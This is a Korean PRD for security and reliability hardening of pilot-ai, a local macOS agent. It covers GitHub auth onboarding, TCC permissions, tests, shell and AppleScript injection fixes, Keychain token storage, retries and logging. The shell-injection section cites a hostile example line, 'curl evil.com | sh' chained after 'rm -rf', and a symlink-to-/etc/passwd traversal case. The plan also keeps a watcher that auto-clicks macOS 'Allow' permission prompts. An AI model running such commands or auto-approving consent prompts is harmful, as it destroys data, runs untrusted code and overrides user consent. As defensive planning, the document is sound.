# Phase 4: Architecture Hardening — PRD

## 1. 배경

Phase 1~3을 통해 pilot-ai는 21개 도구, 멀티 메신저, 세션 연속성, MCP 자동 탐색 등 기능적으로 완성된 상태다.
그러나 글로벌 시니어 아키텍트 관점에서 전체 코드베이스(61개 소스 파일, ~7,900 LOC)를 정밀 점검한 결과,
**안정성·보안·운영성** 측면에서 아래와 같은 구조적 취약점이 식별되었다.

이 Phase의 목표는 기존 코드의 신뢰도와 운영 품질을 프로덕션 수준으로 끌어올리고,
**핵심 연동(GitHub)의 온보딩 누락**과 **macOS TCC 권한 관리 개선**을 포함한다.

---

## 2. 핵심 취약점 분석

### 2.1 GitHub 연동 온보딩 부재 (Critical)

| 항목 | 현황 |
|------|------|
| 온보딩 포함 여부 | ❌ `init.ts`의 `setupIntegrations()`에 GitHub 없음 |
| 토큰 관리 | ❌ pilot-ai가 관리하지 않음 — 시스템 `gh` CLI에 전적 의존 |
| 인증 사전 검증 | ❌ `isGhAuthenticated()` 함수 존재하나 어디서도 호출하지 않음 |
| 에러 처리 | ❌ 인증 안 된 상태에서 `gh` 명령 실행 → raw 에러 메시지 노출 |
| Config 섹션 | ❌ `schema.ts`에 GitHub 설정 섹션 없음 |

**문제의 심각성:**
GitHub는 pilot-ai의 핵심 도구(PR 생성, 이슈 관리, CI 확인)인데, 온보딩에서 완전히 빠져 있다.
사용자가 `gh auth login`을 별도로 실행해야 하며, 이를 모르면 모든 GitHub 작업이 실패한다.

**`gh` CLI 인증 상태 유지 방식:**
- `gh auth login` → `~/.config/gh/hosts.yml`에 OAuth 토큰 저장
- 토큰은 영구적이나, GitHub에서 revoke하거나 토큰 만료 시 재인증 필요
- `gh auth status` → 현재 인증 상태 + 토큰 유효성 확인
- `gh auth refresh` → 토큰 갱신 (scope 변경 시)
- **핵심:** `gh` CLI가 자체 credential store를 관리하므로, pilot-ai는 `gh` 설치 + 인증 여부만 확인하면 됨

### 2.2 macOS TCC 권한 팝업 반복 문제 (High)

| 항목 | 현황 |
|------|------|
| 현상 | `"node" would like to access data from other apps` 팝업이 반복 출현 |
| 원인 | macOS TCC가 source app × target app 조합별로 권한을 추적 — 새 앱 접근 시마다 팝업 |
| 현재 대응 | `PermissionWatcher`가 "Allow" 버튼 자동 클릭 (Accessibility 권한 필요) |
| 한계점 | ① Accessibility 수동 설정 필수 ② 진단 도구 없음 ③ 권한 리셋 방법 안내 없음 |

**macOS TCC 동작 원리:**
- TCC는 **부모 앱**을 기준으로 권한 추적: Terminal에서 실행 → `com.apple.Terminal`, launchd에서 실행 → `node` 바이너리 자체
- 한 번 "Allow"/"Don't Allow" 클릭하면 영구 저장 (사용자 TCC.db)
- "Don't Allow" 실수 시 → `tccutil reset AppleEvents` 후 재트리거 필요
- **Full Disk Access** + **Accessibility**를 `node` 바이너리에 부여하면 대부분의 팝업 해결

### 2.3 테스트 부재 (Critical)

| 항목 | 현황 |
|------|------|
| 단위 테스트 | 0개 — agent, tools, messenger, security 전 영역 미커버 |
| 위험도 | **Critical** — 리팩토링·기능 추가 시 회귀 방어 불가 |

**구체적 위험 영역:**
- `safety.ts` — classifySafety() 정규식이 false positive/negative 생성 가능 (예: 코드 주석 안의 "rm -rf" 탐지)
- `claude.ts` — parseClaudeJsonOutput() JSONL 파싱에서 깨진 JSON 처리 미검증
- `heartbeat.ts` — cron 파싱 로직(range, step, list) 엣지케이스 미검증
- `session.ts` — TTL 만료, 동시 로딩 race condition 미검증

### 2.4 보안 취약점 (High)

#### 2.4.1 Shell Injection
- **위치:** `src/tools/shell.ts`
- **현황:** `spawn('sh', ['-c', command])` — 사용자 입력이 그대로 셸에 전달
- **방어:** `isCommandBlocked()` 정규식 기반 블랙리스트 → 우회 가능
- **예시:** `rm -rf /tmp && curl evil.com | sh` — 체이닝으로 블랙리스트 회피 가능

#### 2.4.2 AppleScript Injection
- **위치:** `notification.ts`, `calendar.ts`, `clipboard.ts`
- **현황:** 각 파일마다 독자적인 escape 함수 구현 (3종 중복)
- **문제:** 백틱(`` ` ``), `$(...)` 등 셸 확장 문자 미처리
- **위험:** 악의적 입력으로 osascript를 통한 임의 명령 실행

#### 2.4.3 토큰 저장 (Plain JSON)
- **위치:** `google-auth.ts`, `email.ts` → `~/.pilot/credentials/*.json`
- **현황:** 파일 모드 0o600 설정하지만 umask에 의해 덮어쓰일 수 있음
- **개선:** macOS Keychain에 이미 `keychain.ts`가 있으나 Google/Email 토큰은 미사용

#### 2.4.4 Symlink 기반 Path Traversal
- **위치:** `filesystem.ts`, `obsidian.ts`
- **현황:** `path.resolve()` + prefix 검사로 방어하지만, symlink follow 시 우회 가능
- **예시:** `/allowed/dir/link → /etc/passwd` — resolve 결과는 allowed 경로이나 실제 읽기는 /etc

### 2.5 복원력 부재 (High)

| 항목 | 현황 | 위험 |
|------|------|------|
| 재시도 로직 | 모든 외부 API 호출이 1회 시도 후 즉시 실패 | 일시적 네트워크 오류에 취약 |
| 서킷 브레이커 | 없음 — Claude CLI 반복 장애 시 무한 재시도 | 리소스 고갈 |
| 태스크 큐 영속성 | 인메모리 전용 — 데몬 재시작 시 대기 작업 전부 소실 | 작업 유실 |
| 메신저 재접속 | 라이브러리 기본 동작에 의존 — 명시적 재접속 없음 | 장시간 운영 시 연결 끊김 |

### 2.6 메시지 처리 취약점 (Medium)

#### 2.6.1 메시지 크기 미제한
- Slack API: 텍스트 4,000자 제한 / Telegram API: 4,096자 제한
- `core.ts`에서 응답을 잘라내지 않고 그대로 전송 → API 에러 발생
- Claude 응답이 수천 줄일 수 있으므로 반드시 truncation/splitting 필요

#### 2.6.2 Rate Limiting 부재 (메신저)
- Slack/Telegram 어댑터에 발신 rate limit 없음
- burst 전송 시 API 제한에 걸릴 수 있음

### 2.7 코드 중복 & 일관성 (Medium)

| 중복 영역 | 파일 | 위험 |
|-----------|------|------|
| AppleScript 이스케이프 | `notification.ts`, `calendar.ts`, `clipboard.ts` | 하나만 수정하면 나머지 취약 |
| OAuth2 토큰 관리 | `email.ts`, `google-auth.ts`, `google-calendar.ts`, `google-drive.ts` | 갱신 로직 불일치 가능 |
| 에러 처리 패턴 | 일부는 throw, 일부는 null 반환, 일부는 silent catch | 디버깅 어려움 |

### 2.8 관측성 부재 (Medium)

| 항목 | 현황 |
|------|------|
| 구조화 로깅 | 없음 — `console.error()` 산발적 사용 |
| 상관관계 ID | 없음 — 요청 추적 불가 |
| 메트릭스 | 없음 — 응답 시간, 성공률, 큐 깊이 등 측정 불가 |
| 헬스체크 | `/health` 존재하지만 내부 상태(메신저 연결, Claude 가용성) 미반영 |

### 2.9 메모리 & 리소스 관리 (Low-Medium)

| 항목 | 위치 | 위험 |
|------|------|------|
| 무제한 큐 증가 | `queue.ts` | 백프레셔 없이 태스크 무한 누적 가능 |
| 스트림 버퍼 | `claude.ts` lineBuffer | 개행 없는 대용량 청크 시 메모리 스파이크 |
| 승인 대기 맵 | `safety.ts` | 타임아웃 후에도 Map 엔트리 미정리 |
| 세션 스토어 | `session.ts` | 동시 로드 시 race condition |
| 히스토리 파일 | `memory.ts` | `history/*.md` 무한 증가, 정리 정책 없음 |
| 파일 검색 재귀 | `filesystem.ts` | 최대 깊이 제한 없음, symlink loop 가능 |

---

## 3. 개선 계획

### 우선순위 체계
- **P0 (Critical):** 보안 취약점, 핵심 연동 누락, 데이터 유실 위험 → 즉시 수정
- **P1 (High):** 운영 안정성, 사용자 경험 → 1주 내 수정
- **P2 (Medium):** 코드 품질 & 관측성 → 2주 내 수정
- **P3 (Low):** 최적화 & 개선 → 여유 시 수정

---

### 3.1 [P0] GitHub 연동 온보딩 & 상태 관리

**목표:** GitHub를 온보딩 플로우에 포함하고, 인증 상태를 지속적으로 관리

#### 3.1.1 온보딩 추가 (`init.ts`)

`setupIntegrations()`에 GitHub 셋업 단계 추가:

1. **`gh` CLI 설치 확인** — `which gh` 실행
   - 미설치 시: `brew install gh` 안내 출력 후 계속 진행 (선택 통합)
2. **`gh auth status` 확인** — 이미 인증되어 있으면 스킵
3. **미인증 시 `gh auth login` 가이드:**
   - OAuth (browser) 또는 Personal Access Token 선택
   - 필요 scope: `repo`, `read:org`, `workflow` (CI 확인용)
   - `gh auth login --scopes repo,read:org,workflow` 실행 안내
4. **인증 성공 확인** — `gh auth status` 재실행
5. **config 저장** — `config.github.enabled: true` 플래그만 저장 (토큰은 `gh`가 관리)

#### 3.1.2 Config 스키마 확장 (`schema.ts`)

```typescript
github: z.object({
  enabled: z.boolean().default(false),
  defaultOrg: z.string().optional(),    // 기본 organization
  defaultRepo: z.string().optional(),   // 기본 repository
}).optional()
```

#### 3.1.3 런타임 인증 상태 관리

**전략: `gh` CLI에 위임 + 사전 검증**

`gh` CLI는 자체 credential store(`~/.config/gh/hosts.yml`)로 토큰을 영구 관리한다.
pilot-ai가 별도 토큰을 관리할 필요 없이, 아래 사항만 보장하면 된다:

1. **에이전트 시작 시 검증** — `core.ts` 초기화에서 `isGhAuthenticated()` 호출
   - 실패 시: 메신저로 경고 메시지 전송 ("GitHub disconnected. Run `gh auth login` to reconnect.")
   - 에이전트 자체는 계속 실행 (GitHub 외 기능은 정상 동작)
2. **GitHub 도구 호출 전 검증** — `github.ts`의 각 함수에서 사전 auth 체크
   - 미인증 시: 에러 대신 사용자 친화적 가이드 반환
3. **주기적 상태 확인** — heartbeat tick에서 `gh auth status` 점검 (1시간 간격)
   - 토큰 만료 감지 → 메신저로 재인증 안내

#### 3.1.4 `gh` 인증 영속성 분석

| 방식 | 토큰 위치 | 영속성 | pilot-ai 관여 |
|------|-----------|--------|---------------|
| `gh auth login` (OAuth) | `~/.config/gh/hosts.yml` | 영구 (revoke 전까지) | 불필요 — gh가 관리 |
| `gh auth login --with-token` | 동일 | 영구 | 불필요 |
| `GITHUB_TOKEN` 환경변수 | 메모리/셸 | 세션 한정 | ❌ 비권장 — 재시작 시 소실 |
| GitHub App | JWT + Installation token | 1시간 만료 | ❌ 과도한 복잡성 |

**결론:** `gh auth login` (OAuth) 방식이 최적. 토큰이 `~/.config/gh/hosts.yml`에 영구 저장되며, `gh`가 자동 refresh 처리. pilot-ai는 인증 여부만 확인하면 됨.

---

### 3.2 [P0] macOS TCC 권한 일괄 설정 & 진단

**목표:** "node would like to access data from other apps" 팝업을 최소화하고, 권한 문제 진단 도구 제공

#### 3.2.1 온보딩 TCC 사전 트리거 강화

현재 `requestPermissions()`에서 4개 권한만 트리거. 추가:

1. **일괄 권한 요청 스크립트** — 자주 사용하는 앱에 대한 Automation 권한을 한 번에 트리거
   ```
   대상 앱 목록:
   - System Events (필수 — 모든 AppleScript 자동화)
   - Finder (파일 관리)
   - Calendar (일정 관리)
   - Mail (이메일)
   - Safari / Chrome (브라우저 자동화)
   - Terminal (셸 명령)
   ```
2. 각 앱에 대해 간단한 osascript 명령 실행 → TCC 팝업 발생 → 사용자 "Allow" 클릭
3. 실행 전 안내 메시지: "여러 개의 권한 팝업이 나타납니다. 모두 'Allow'를 클릭해 주세요."

#### 3.2.2 `pilot-ai doctor` 진단 명령

새 CLI 서브커맨드 `npx pilot-ai doctor`:

1. **시스템 요구사항 확인**
   - Node.js 버전
   - Claude CLI 설치/인증
   - `gh` CLI 설치/인증
   - Playwright 브라우저 설치
2. **macOS 권한 확인**
   - Automation (System Events, Finder, Calendar 등)
   - Screen Recording
   - Accessibility
   - Full Disk Access
3. **권한 문제 해결 가이드**
   - 각 미허용 권한에 대해: System Settings 경로 + tccutil reset 명령 안내
   - "Don't Allow"로 거부된 경우 리셋 방법:
     ```bash
     tccutil reset AppleEvents  # 모든 Automation 권한 리셋
     npx pilot-ai init          # 재실행하여 재요청
     ```
4. **Full Disk Access 안내**
   - `node` 바이너리 경로 출력 (`which node`)
   - System Settings > Privacy & Security > Full Disk Access에 추가 안내
   - Full Disk Access 부여 시 대부분의 "access data from other apps" 팝업 해결

#### 3.2.3 PermissionWatcher 개선

1. 자동 클릭 성공/실패 로깅 강화 (어떤 앱의 권한을 승인했는지 기록)
2. 자동 클릭 실패 3회 연속 시 → 메신저로 수동 조치 안내
3. 자동 클릭 비활성화 옵션 (config: `security.autoApprovePermissions: false`)

---

### 3.3 [P0] 핵심 테스트 커버리지 구축

**목표:** 위험도 높은 모듈에 대한 단위 테스트 작성 (vitest)

**대상 모듈 및 테스트 케이스:**

#### `safety.ts` — classifySafety()
- `git push` → Dangerous 분류
- `git commit` → Moderate 분류
- `ls -la` → Safe 분류
- 코드 주석 안의 `rm -rf` → false positive 검증
- 체이닝 명령 (`cmd1 && cmd2`) → 각각 분류

#### `claude.ts` — parseClaudeJsonOutput()
- 정상 JSONL 파싱
- 깨진 JSON (중간 절단) 처리
- 빈 출력 처리
- tool_use 블록 감지

#### `heartbeat.ts` — cron 매칭
- `* * * * *` → 항상 매칭
- `0 9 * * 1-5` → 평일 오전 9시만
- `*/5 * * * *` → 5분 간격
- 범위 초과 값 (예: `60 * * * *`) → 에러

#### `session.ts` — 세션 관리
- 생성/조회/갱신 라이프사이클
- TTL 만료 후 조회 → null
- 동시 로드 race condition 방어

#### `sandbox.ts` — 경로 검증
- 허용 경로 내 파일 → 통과
- 차단 경로 (`~/.ssh`) → 거부
- `../` traversal → 거부
- symlink 통한 우회 시도

#### `auth.ts` — 인증
- 허용된 사용자 → 통과
- 비허용 사용자 → 거부

**산출물:** `tests/` 디렉토리에 각 모듈별 `.test.ts` 파일

---

### 3.4 [P0] Shell Injection 방어 강화

**현재:**
```typescript
// shell.ts
spawn('sh', ['-c', command])  // 위험: command가 문자열 그대로 셸에 전달
```

**개선:**
1. `isCommandBlocked()` 강화 — 파이프(`|`), 체이닝(`&&`, `||`, `;`), 서브셸(`$(...)`, `` `...` ``) 내부 명령도 개별 검사
2. 환경변수 주입 방어 — `env` 옵션에서 민감 변수 완전 제거 확인
3. 명령어 길이 제한 추가 (DoS 방어)

**참고:** `spawn('sh', ['-c', ...])` 자체는 Claude CLI 에이전트 특성상 불가피 (LLM이 자유형 명령 생성).
따라서 블랙리스트 강화 + 감사 로깅 강화로 방어.

---

### 3.5 [P0] AppleScript/Shell 이스케이프 통합

**현재:** 3개 파일에 독자 escape 함수 (notification.ts, calendar.ts, clipboard.ts)

**개선:**
1. `src/utils/escape.ts` 신규 모듈 생성
2. `escapeAppleScript(str)` — 백슬래시, 따옴표, 백틱, `$(...)` 등 완전 이스케이프
3. `escapeShellArg(str)` — POSIX 호환 셸 인자 이스케이프
4. 기존 3개 파일의 독자 함수를 통합 모듈로 교체
5. 이스케이프 함수에 대한 단위 테스트 필수

---

### 3.6 [P0] 토큰 저장소 Keychain 통합

**현재:** Google/Email OAuth 토큰 → `~/.pilot/credentials/*.json` (평문)

**개선:**
1. `keychain.ts`의 `setSecret()`/`getSecret()` 활용
2. `google-auth.ts` — 토큰 저장/로드를 Keychain으로 이관
3. `email.ts` — 동일 이관
4. JSON 파일 대신 Keychain에 직렬화된 토큰 저장
5. 마이그레이션: 기존 JSON 파일 존재 시 → Keychain으로 이관 후 JSON 삭제

---

### 3.7 [P0] Symlink Path Traversal 방어

**현재:** `path.resolve()` + prefix 검사만 수행

**개선:**
1. `fs.realpathSync()` 사용하여 symlink 완전 해석 후 경로 검증
2. `sandbox.ts`의 `isPathAllowed()` 수정
3. `filesystem.ts`, `obsidian.ts`에서 파일 접근 전 realpath 검증
4. 테스트: symlink → 차단 경로를 가리키는 케이스

---

### 3.8 [P1] 메시지 크기 제한 & 분할 전송

**현재:** 응답 길이 무관하게 그대로 전송 → Slack/Telegram API 에러

**개선:**
1. `messenger/adapter.ts`에 `MAX_MESSAGE_LENGTH` 상수 추가
   - Slack: 3,900자 (여유분 100자)
   - Telegram: 4,000자 (여유분 96자)
2. `sendText()` 구현에서 초과 시 자동 분할 전송
3. 분할 시 코드 블록(```)이 깨지지 않도록 처리
4. 매우 긴 응답(10,000자+)은 파일로 업로드 옵션 제공

---

### 3.9 [P1] 재시도 & 서킷 브레이커

**대상:** 모든 외부 API 호출 (Claude CLI, Notion, Linear, Google, GitHub)

**개선:**
1. `src/utils/retry.ts` — 범용 재시도 유틸
   - 지수 백오프 (base 1초, max 30초, jitter 추가)
   - 최대 3회 재시도
   - 재시도 가능 에러 판별 (네트워크, 5xx, rate limit)
2. `src/utils/circuit-breaker.ts` — 서킷 브레이커
   - 5회 연속 실패 → OPEN (30초간 즉시 실패 반환)
   - HALF-OPEN → 1회 시도 → 성공 시 CLOSED
3. `claude.ts`에 서킷 브레이커 적용
4. 외부 API 도구에 재시도 적용

---

### 3.10 [P1] 태스크 큐 영속성

**현재:** 인메모리 전용 → 데몬 재시작 시 모든 대기 작업 소실

**개선:**
1. 큐 상태를 `~/.pilot/task-queue.json`에 주기적 저장 (1초 debounce)
2. 데몬 시작 시 미완료 태스크 복원
3. `queued` 상태만 복원 (running은 failed로 전환)
4. 큐 최대 크기 제한 (기본 50개) — 초과 시 거부 + 사용자 알림
5. 백프레셔: 큐 깊이 임계값(20개) 초과 시 경고 메시지

---

### 3.11 [P1] 에러 처리 통일

**현재:** throw / null 반환 / silent catch 혼재

**개선:**
1. `src/utils/errors.ts` — 구조화된 에러 클래스 체계
   ```
   PilotError (base)
   ├── AuthError          — 인증/인가 실패
   ├── ToolError          — 도구 실행 실패
   ├── ConfigError        — 설정 누락/잘못됨
   ├── ExternalApiError   — 외부 API 호출 실패
   └── TimeoutError       — 타임아웃
   ```
2. 각 에러에 `code`, `userMessage` (사용자 친화적), `cause` (원인) 포함
3. `core.ts`에서 에러 타입별 분기 처리 및 사용자 친화적 메시지 전송
4. silent catch(`.catch(() => {})`) 제거 — 최소한 로깅

---

### 3.12 [P2] 구조화 로깅 & 관측성

**현재:** `console.error()` 산발적 사용, 요청 추적 불가

**개선:**
1. `src/utils/logger.ts` — 구조화 로거
   - JSON 형식 로그 (timestamp, level, correlationId, module, message, data)
   - 로그 레벨: DEBUG, INFO, WARN, ERROR
   - 파일 출력: `~/.pilot/logs/pilot.log` (일별 로테이션)
2. 상관관계 ID (correlationId)
   - 메시지 수신 시 UUID 생성
   - 해당 요청의 모든 로그에 동일 ID 전파
   - 감사 로그(`audit.jsonl`)에도 correlationId 추가
3. 기본 메트릭스
   - 요청 수, 응답 시간, 에러율 (인메모리 카운터)
   - `/health` 엔드포인트에 메트릭스 포함

---

### 3.13 [P2] 메신저 안정성 강화

**개선:**
1. 연결 상태 모니터링
   - Slack: `connection` 이벤트 리스너 + 재접속 로깅
   - Telegram: polling 에러 핸들러 + 자동 재시작
2. 발신 Rate Limiter
   - 토큰 버킷 알고리즘 (Slack: 1msg/sec, Telegram: 30msg/sec)
   - 초과 시 큐잉 후 순차 전송
3. Graceful Shutdown
   - SIGTERM 수신 시 진행 중 메시지 완료 대기 (최대 10초)
   - 메신저 연결 정리 후 종료

---

### 3.14 [P2] OAuth 토큰 관리 통합

**현재:** email.ts, google-auth.ts, google-calendar.ts, google-drive.ts에 토큰 로직 분산

**개선:**
1. `src/utils/oauth-manager.ts` — 통합 OAuth 토큰 매니저
   - 토큰 저장/로드 (Keychain 연동, 3.6과 연계)
   - 자동 refresh (만료 5분 전 선제 갱신)
   - refresh 실패 시 재시도 (3.9 retry 유틸 활용)
2. 기존 4개 파일의 토큰 로직을 OAuthManager로 위임
3. 중복 코드 제거

---

### 3.15 [P3] 리소스 관리 개선

**개선:**
1. `session.ts` — Promise 기반 로딩 직렬화 (race condition 방지)
2. `safety.ts` — 승인 타임아웃 후 Map 엔트리 자동 정리
3. `claude.ts` — lineBuffer 최대 크기 제한 (1MB)
4. `filesystem.ts` — searchFiles() 최대 재귀 깊이 제한 (기본 20)
5. `memory.ts` — history 파일 보관 기간 제한 (기본 30일, 이전 파일 자동 삭제)
6. `heartbeat.ts` — HEARTBEAT.md 파싱 결과 캐싱 (파일 mtime 기반 무효화)

---

### 3.16 [P3] 헬스체크 강화

**현재:** `/health` → 단순 OK 응답

**개선:**
```json
{
  "status": "healthy",
  "uptime": 3600,
  "messenger": { "connected": true, "platform": "slack" },
  "claude": { "available": true, "mode": "cli" },
  "github": { "authenticated": true },
  "queue": { "pending": 2, "running": 1 },
  "memory": { "rss": "120MB" }
}
```
- 메신저 연결 상태 실시간 반영
- Claude CLI 가용성 체크 (마지막 성공 시각)
- GitHub 인증 상태 포함
- 큐 깊이 포함
- 비정상 시 `status: "degraded"` 반환

---

## 4. 범위 외 (Non-Goals)

- 새로운 도구/통합 추가 (Phase 5에서)
- 멀티 유저 지원 (현재 1인 사용자 대상)
- UI/대시보드 개발
- 클라우드 배포 (로컬 macOS 전용 유지)

---

## 5. 성공 지표

| 지표 | 목표 |
|------|------|
| 핵심 모듈 테스트 커버리지 | safety, claude, heartbeat, session, sandbox, auth ≥ 80% |
| 보안 취약점 (P0) | 0건 |
| 데몬 재시작 시 작업 유실 | 0건 (queued 상태 복원) |
| 메시지 전송 실패 (크기 초과) | 0건 |
| 평균 외부 API 실패 복구 | 일시적 오류의 90%+ 자동 복구 |
| GitHub 인증 끊김 감지 | 1시간 이내 사용자에게 알림 |
| TCC 팝업 반복 | 온보딩 후 추가 팝업 0건 (auto-approve 제외) |

---

## 6. 기술적 제약

- Node.js 런타임 (ES2022, ESM)
- 외부 의존성 최소화 원칙 유지 (retry, circuit breaker 등 자체 구현)
- macOS 전용 (Keychain, AppleScript, launchd, TCC)
- 기존 API 인터페이스 하위 호환성 유지
- GitHub 인증은 `gh` CLI에 위임 (자체 토큰 관리 불필요)
